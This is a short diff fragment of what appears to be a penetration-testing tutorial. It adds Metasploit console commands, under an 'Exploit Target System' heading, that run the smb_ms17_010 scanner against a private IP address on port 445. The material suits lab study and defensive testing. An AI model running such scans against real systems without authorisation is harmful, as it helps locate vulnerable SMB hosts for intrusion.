@@ -44,6 +44,20 @@ nbtstat -a 192.168.1.128
 
 ## Exploit Target System Using Metasploit
 
+```
+msf > search smb_ms17_010
+
+msf > Use auxiliary/scanner/smb/smb_ms17_010
+
+msf auxiliary(smb_ms17_010) > set rhost 192.168.1.28
+
+msf auxiliary(smb_ms17_010) > set port 445
+
+msf auxiliary(smb_ms17_010) > exploit
+```
+
+
+
 
 
 
